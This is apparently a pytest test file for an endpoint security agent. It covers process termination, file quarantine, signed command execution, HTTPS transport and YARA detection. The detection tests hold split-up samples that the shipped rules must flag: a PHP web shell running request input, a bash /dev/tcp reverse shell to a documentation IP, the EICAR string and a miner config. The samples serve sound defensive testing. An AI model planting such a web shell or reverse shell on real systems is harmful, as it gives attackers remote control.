"""Agent actuators and command handling. Uses real child processes and real files."""

from __future__ import annotations

import os
import subprocess
import sys
import time
from pathlib import Path

import httpx
import psutil
import pytest
from carylle.security import CommandSigner, generate_signing_keypair
from carylle_agent.actuators.file_quarantine import FileQuarantine
from carylle_agent.actuators.process_terminator import terminate_process
from carylle_agent.commands import CommandExecutor, ReplayGuard, verify_signature
from carylle_agent.safelist import AgentSafelist
from carylle_agent.scanners.yara_scanner import YaraScanner
from carylle_agent.sensors.file_watcher import FileWatcher
from carylle_agent.sensors.process_monitor import ProcessMonitor
from carylle_agent.transport import Transport, TransportConfigError
from carylle_agent.util import sha256_file

from .conftest import ROOT

EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-" + "ANTIVIRUS-TEST-FILE!$H+H*"
# Real antivirus (Windows Defender on a dev machine) quarantines EICAR and web shell samples
# the moment they reach disk. So the shipped rules are tested in memory, and tests that need
# a file on disk use a rule matching this harmless marker.
MARKER = "CARYLLE-TEST-MARKER-" + "7f3a9c"
MARKER_RULE = (
    'rule Carylle_Test_Marker { meta: severity = "high" attack = "T1204.002" '
    f'strings: $a = "{MARKER}" condition: $a }}'
)


@pytest.fixture
def marker_rules(tmp_path) -> Path:
    rules = tmp_path / "rules"
    rules.mkdir()
    (rules / "marker.yar").write_text(MARKER_RULE, encoding="ascii")
    return rules


skip_windows = pytest.mark.skipif(sys.platform == "win32", reason="POSIX-only behaviour")


@pytest.fixture
def safelist() -> AgentSafelist:
    return AgentSafelist.load(ROOT / "config/safelist.yaml")


@pytest.fixture
def child():
    proc = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])
    yield proc
    if proc.poll() is None:
        proc.kill()
    proc.wait(timeout=5)


def target_for(proc) -> dict:
    live = psutil.Process(proc.pid)
    return {"pid": proc.pid, "create_time": live.create_time(), "exe": live.exe(), "name": live.name()}


class TestProcessTerminator:
    def test_terminates_the_right_process(self, child, safelist):
        result = terminate_process(target_for(child), safelist, 3)
        assert result.status == "succeeded", result.detail
        assert child.wait(timeout=5) is not None

    def test_refuses_when_the_pid_was_reused(self, child, safelist):
        target = {**target_for(child), "create_time": 12345.0}
        result = terminate_process(target, safelist, 1)
        assert result.status == "refused" and "different process" in result.detail
        assert child.poll() is None

    def test_refuses_when_the_executable_differs(self, child, safelist):
        target = {**target_for(child), "exe": "/somewhere/else"}
        result = terminate_process(target, safelist, 1)
        assert result.status == "refused" and child.poll() is None

    def test_safelist_checks_the_live_path_not_the_claim(self, child):
        exe = psutil.Process(child.pid).exe()
        strict = AgentSafelist(loaded=True, exe_paths={os.path.normcase(exe) if sys.platform == "win32" else exe})
        target = {**target_for(child), "exe": ""}  # The command doesn't mention the protected path.
        assert terminate_process(target, strict, 1).status == "refused"
        assert child.poll() is None

    def test_refuses_without_a_safelist(self, child):
        result = terminate_process(target_for(child), AgentSafelist(loaded=False), 1)
        assert result.status == "refused" and child.poll() is None

    def test_refuses_to_kill_itself(self, safelist):
        me = psutil.Process(os.getpid())
        target = {"pid": me.pid, "create_time": me.create_time(), "exe": me.exe()}
        assert terminate_process(target, safelist, 1).status == "refused"

    def test_refuses_to_kill_its_parent(self, safelist):
        parent = psutil.Process(os.getpid()).parent()
        target = {"pid": parent.pid, "create_time": parent.create_time(), "exe": parent.exe()}
        assert terminate_process(target, safelist, 1).status == "refused"

    def test_already_gone_counts_as_done(self, child, safelist):
        target = target_for(child)
        child.kill()
        child.wait(timeout=5)
        assert terminate_process(target, safelist, 1).status == "succeeded"

    @pytest.mark.parametrize("target", [{}, {"pid": "x", "create_time": 1}, {"pid": 5}])
    def test_malformed_target(self, target, safelist):
        assert terminate_process(target, safelist, 1).status == "refused"

    def test_kills_descendants(self, safelist):
        code = (
            "import subprocess,sys,time;"
            "subprocess.Popen([sys.executable,'-c','import time; time.sleep(60)']);time.sleep(60)"
        )
        parent = subprocess.Popen([sys.executable, "-c", code])
        try:
            deadline = time.time() + 10
            kids: list[psutil.Process] = []
            while time.time() < deadline and not kids:
                kids = psutil.Process(parent.pid).children(recursive=True)
                time.sleep(0.1)
            assert kids
            result = terminate_process(target_for(parent), safelist, 3)
            assert result.status == "succeeded"
            gone, alive = psutil.wait_procs(kids, timeout=5)
            assert not alive
        finally:
            if parent.poll() is None:
                parent.kill()
            parent.wait(timeout=5)


class TestFileQuarantine:
    @pytest.fixture
    def quarantine(self, tmp_path, safelist) -> FileQuarantine:
        return FileQuarantine(tmp_path / "q", safelist)

    @pytest.fixture
    def bad_file(self, tmp_path) -> Path:
        path = tmp_path / "evil.bin"
        path.write_bytes(b"malicious content")
        return path

    def target(self, path: Path) -> dict:
        return {"path": str(path), "sha256": sha256_file(path)}

    def test_quarantine_and_restore(self, quarantine, bad_file):
        original = bad_file.read_bytes()
        result = quarantine.quarantine(self.target(bad_file))
        assert result.status == "succeeded", result.detail
        assert not bad_file.exists()

        items = quarantine.list_items()
        assert len(items) == 1 and items[0]["original_path"] == str(bad_file)

        restored = quarantine.restore(items[0]["id"])
        assert restored.status == "succeeded", restored.detail
        assert bad_file.read_bytes() == original
        assert quarantine.list_items() == []

    def test_wrong_hash_is_left_in_place(self, quarantine, bad_file):
        result = quarantine.quarantine({"path": str(bad_file), "sha256": "0" * 64})
        assert result.status == "refused" and bad_file.exists()
        assert quarantine.list_items() == []
        assert list(quarantine.directory.glob("*.bin")) == []

    def test_protected_path(self, quarantine):
        target_path = "C:\\Windows\\System32\\cmd.exe" if sys.platform == "win32" else "/usr/bin/sudo"
        assert quarantine.quarantine({"path": target_path, "sha256": "0" * 64}).status == "refused"

    def test_no_safelist_refuses(self, tmp_path, bad_file):
        quarantine = FileQuarantine(tmp_path / "q", AgentSafelist(loaded=False))
        assert quarantine.quarantine(self.target(bad_file)).status == "refused" and bad_file.exists()

    def test_safelisted_hash(self, tmp_path, bad_file, safelist):
        safelist.sha256.add(sha256_file(bad_file))
        quarantine = FileQuarantine(tmp_path / "q", safelist)
        assert quarantine.quarantine(self.target(bad_file)).status == "refused"

    def test_missing_file(self, quarantine, tmp_path):
        result = quarantine.quarantine({"path": str(tmp_path / "gone"), "sha256": "0" * 64})
        assert result.status == "failed"

    @pytest.mark.parametrize("target", [{}, {"path": "relative", "sha256": "0" * 64}, {"path": "/tmp/x"}])
    def test_malformed_target(self, quarantine, target):
        assert quarantine.quarantine(target).status == "refused"

    def test_directory_refused(self, quarantine, tmp_path):
        directory = tmp_path / "dir"
        directory.mkdir()
        assert quarantine.quarantine({"path": str(directory), "sha256": "0" * 64}).status == "refused"

    @skip_windows
    def test_symlink_refused(self, quarantine, tmp_path, bad_file):
        link = tmp_path / "link"
        link.symlink_to(bad_file)
        result = quarantine.quarantine({"path": str(link), "sha256": sha256_file(bad_file)})
        assert result.status == "refused" and bad_file.exists() and link.is_symlink()

    def test_restore_will_not_overwrite(self, quarantine, bad_file):
        quarantine.quarantine(self.target(bad_file))
        bad_file.write_bytes(b"new legitimate file")
        item = quarantine.list_items()[0]
        assert quarantine.restore(item["id"]).status == "refused"
        assert bad_file.read_bytes() == b"new legitimate file"

    @pytest.mark.parametrize("bad_id", ["../../etc/passwd", "a/b", "..", "x y"])
    def test_restore_rejects_path_traversal(self, quarantine, bad_id):
        assert quarantine.restore(bad_id).status == "refused"


@pytest.fixture
def keys():
    signing, public = generate_signing_keypair()
    return CommandSigner(signing), public


@pytest.fixture
def executor(keys, tmp_path, safelist) -> CommandExecutor:
    return CommandExecutor(
        "host-1", keys[1], safelist, FileQuarantine(tmp_path / "q", safelist), ReplayGuard(tmp_path / "state"),
        actuators_enabled=True, terminate_grace_seconds=3,
    )


def command(**overrides) -> dict:
    now = time.time()
    fields = {
        "command_id": "act_1",
        "agent_id": "host-1",
        "action": "terminate_process",
        "target": {"pid": 999999, "create_time": 1.0},
        "issued_at": now,
        "expires_at": now + 60,
        "nonce": "n",
    }
    fields.update(overrides)
    return fields


class TestCommandExecutor:
    def test_executes_a_valid_command(self, keys, executor, child):
        outcome = executor.handle(keys[0].sign(command(target=target_for(child))))
        assert outcome.result.status == "succeeded", outcome.result.detail
        child.wait(timeout=5)

    def test_forged_signature_is_ignored(self, executor, child):
        signing, _ = generate_signing_keypair()
        forged = CommandSigner(signing).sign(command(target=target_for(child)))
        assert executor.handle(forged) is None
        assert child.poll() is None and executor.rejected_signatures == 1

    def test_tampered_command_is_ignored(self, keys, executor, child):
        envelope = keys[0].sign(command(target={"pid": 999999, "create_time": 1.0}))
        envelope["command"]["target"] = target_for(child)
        assert executor.handle(envelope) is None and child.poll() is None

    @pytest.mark.parametrize("envelope", [{}, {"command": {}}, {"signature": "x"}, {"command": {}, "signature": "!!"}])
    def test_junk_envelopes(self, executor, envelope):
        assert executor.handle(envelope) is None

    def test_command_for_another_agent_is_ignored(self, keys, executor, child):
        assert executor.handle(keys[0].sign(command(agent_id="host-2", target=target_for(child)))) is None
        assert child.poll() is None

    def test_expired_command_is_refused(self, keys, executor, child):
        outcome = executor.handle(keys[0].sign(command(target=target_for(child), expires_at=time.time() - 1)))
        assert outcome.result.status == "refused" and child.poll() is None

    def test_replay_is_ignored(self, keys, executor):
        envelope = keys[0].sign(command())
        assert executor.handle(envelope) is not None
        assert executor.handle(envelope) is None

    def test_replay_guard_survives_restart(self, keys, executor, tmp_path, safelist):
        envelope = keys[0].sign(command())
        executor.handle(envelope)
        restarted = CommandExecutor(
            "host-1", keys[1], safelist, FileQuarantine(tmp_path / "q", safelist), ReplayGuard(tmp_path / "state"),
            actuators_enabled=True,
        )
        assert restarted.handle(envelope) is None

    def test_actuators_disabled_by_default(self, keys, tmp_path, safelist, child):
        executor = CommandExecutor(
            "host-1", keys[1], safelist, FileQuarantine(tmp_path / "q", safelist), ReplayGuard(tmp_path / "s")
        )
        outcome = executor.handle(keys[0].sign(command(target=target_for(child))))
        assert outcome.result.status == "refused" and "disabled" in outcome.result.detail
        assert child.poll() is None

    def test_unknown_action_is_refused(self, keys, executor):
        assert executor.handle(keys[0].sign(command(action="run_shell"))).result.status == "refused"

    def test_signature_verification_matches_the_server(self, keys):
        assert verify_signature(keys[1], keys[0].sign({"unicode": "é", "n": 1.5}))


class TestTransport:
    def make(self, tmp_path, handler, **kwargs) -> Transport:
        client = httpx.Client(transport=httpx.MockTransport(handler), base_url="https://server")
        return Transport("https://server", "tok", spool_dir=tmp_path / "spool", client=client, **kwargs)

    @pytest.mark.parametrize("url", ["http://example.com", "http://10.0.0.5:8443", "ftp://x"])
    def test_refuses_plain_http_to_remote_servers(self, url):
        with pytest.raises(TransportConfigError):
            Transport(url, "tok")

    def test_allows_loopback_http(self):
        Transport("http://127.0.0.1:8443", "tok").close()

    def test_lab_override_for_http(self):
        Transport("http://server:8443", "tok", allow_insecure_http=True).close()

    def test_sends_events(self, tmp_path):
        seen = []

        def handler(request):
            seen.append(request)
            return httpx.Response(202, json={})

        assert self.make(tmp_path, handler).send_events([{"a": 1}])
        assert len(seen) == 1

    def test_outage_spools_then_replays_in_order(self, tmp_path):
        up = {"value": False}
        delivered = []

        def handler(request):
            if not up["value"]:
                raise httpx.ConnectError("down")
            import json

            delivered.append(json.loads(request.content)["events"])
            return httpx.Response(202, json={})

        transport = self.make(tmp_path, handler)
        assert not transport.send_events([{"n": 1}])
        assert not transport.send_events([{"n": 2}])
        assert len(list((tmp_path / "spool").glob("*.jsonl"))) == 2

        up["value"] = True
        transport._retry_at = 0
        assert transport.send_events([{"n": 3}])
        assert delivered == [[{"n": 1}], [{"n": 2}], [{"n": 3}]]
        assert list((tmp_path / "spool").glob("*.jsonl")) == []

    @pytest.mark.parametrize("status", [401, 403, 429, 500, 503])
    def test_transient_and_auth_failures_are_kept(self, tmp_path, status):
        transport = self.make(tmp_path, lambda r: httpx.Response(status))
        assert not transport.send_events([{"n": 1}])
        assert len(list((tmp_path / "spool").glob("*.jsonl"))) == 1

    def test_unacceptable_batch_is_dropped(self, tmp_path):
        transport = self.make(tmp_path, lambda r: httpx.Response(413))
        assert not transport.send_events([{"n": 1}])
        assert list((tmp_path / "spool").glob("*.jsonl")) == []

    def test_spool_is_capped(self, tmp_path):
        def down(request):
            raise httpx.ConnectError("down")

        transport = self.make(tmp_path, down, spool_max_bytes=500)
        for i in range(10):
            transport._retry_at = float("inf")
            transport.send_events([{"n": i, "pad": "x" * 200}])
        assert transport.spool_dropped > 0
        total = sum(f.stat().st_size for f in (tmp_path / "spool").glob("*.jsonl"))
        assert total <= 500


class TestSensors:
    @staticmethod
    def shipped_rules_match(data: bytes) -> list[str]:
        scanner = YaraScanner(ROOT / "config/yara")
        assert scanner.available
        return [m.rule for m in scanner._rules.match(data=data)]

    def test_shipped_rules_detect_eicar(self):
        assert self.shipped_rules_match(EICAR.encode()) == ["EICAR_Test_File"]

    def test_shipped_rules_detect_webshell(self):
        sample = "<?p" + "hp sys" + "tem($_G" + "ET['c']); ?>"
        assert self.shipped_rules_match(sample.encode()) == ["Webshell_PHP_Exec_From_Request"]

    def test_shipped_rules_detect_reverse_shell_script(self):
        sample = "#!/bin/sh\nba" + "sh -i >& /dev/" + "tcp/203.0.113.1/4444 0>&1\n"
        assert self.shipped_rules_match(sample.encode()) == ["Script_Reverse_Shell"]

    def test_shipped_rules_detect_miner_config(self):
        assert self.shipped_rules_match(b'{"url": "stratum+tcp://pool:3333"}') == ["Cryptominer_Config"]

    def test_shipped_rules_ignore_clean_content(self):
        assert self.shipped_rules_match(b"<?php echo 'hello world'; ?>\nnothing to see here") == []

    def test_yara_scans_a_file_and_reads_rule_metadata(self, tmp_path, marker_rules):
        sample = tmp_path / "sample.txt"
        sample.write_text(MARKER, encoding="ascii")
        matches = YaraScanner(marker_rules).scan(sample)
        assert [m["rule"] for m in matches] == ["Carylle_Test_Marker"]
        assert matches[0]["severity"] == "high" and matches[0]["attack"] == "T1204.002"

    def test_yara_ignores_a_clean_file(self, tmp_path, marker_rules):
        sample = tmp_path / "clean.txt"
        sample.write_text("nothing to see here", encoding="ascii")
        assert YaraScanner(marker_rules).scan(sample) == []

    def test_yara_survives_an_unreadable_file(self, tmp_path, marker_rules):
        assert YaraScanner(marker_rules).scan(tmp_path / "absent") == []

    def test_yara_without_rules_is_just_unavailable(self, tmp_path):
        scanner = YaraScanner(tmp_path)
        assert not scanner.available and scanner.scan(__file__) == []

    def test_process_monitor_reports_a_new_process(self):
        import threading

        events = []
        monitor = ProcessMonitor(events.append, threading.Event())
        known = set(monitor.snapshot())
        proc = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)  # marker-xyz"])
        try:
            deadline = time.time() + 10
            while time.time() < deadline:
                known = monitor.poll_once(known)
                if any(e["data"]["pid"] == proc.pid for e in events):
                    break
                time.sleep(0.1)
            event = next(e for e in events if e["data"]["pid"] == proc.pid)
            assert "marker-xyz" in event["data"]["cmdline"]
            assert event["data"]["create_time"] == psutil.Process(proc.pid).create_time()
            assert event["data"]["sha256"] and event["data"]["parent_name"]
        finally:
            proc.kill()
            proc.wait(timeout=5)

    def test_file_watcher_hashes_and_scans(self, tmp_path, marker_rules):
        import threading

        events = []
        stop = threading.Event()
        watched = tmp_path / "watched"
        watched.mkdir()
        watcher = FileWatcher(events.append, stop, [str(watched)], YaraScanner(marker_rules), debounce_seconds=0.1)
        watcher.start()
        watcher.ready.wait(5)
        time.sleep(0.2)
        sample = watched / "sample.txt"
        sample.write_text(MARKER, encoding="ascii")
        deadline = time.time() + 10
        while time.time() < deadline and not any(e["type"] == "yara_match" for e in events):
            time.sleep(0.1)
        stop.set()
        watcher.join(timeout=5)

        match = next(e for e in events if e["type"] == "yara_match")
        assert match["data"]["path"] == str(sample) and match["data"]["sha256"] == sha256_file(sample)
        assert any(e["type"] == "file_event" and e["data"]["sha256"] for e in events)

    def test_file_watcher_excludes_its_own_directories(self, tmp_path):
        import threading

        events = []
        excluded = tmp_path / "spool"
        excluded.mkdir()
        watcher = FileWatcher(events.append, threading.Event(), [str(tmp_path)], exclude=[str(excluded)], debounce_seconds=0)
        watcher.record(str(excluded / "x.jsonl"), "created")
        watcher._flush(force=True)
        assert events == []
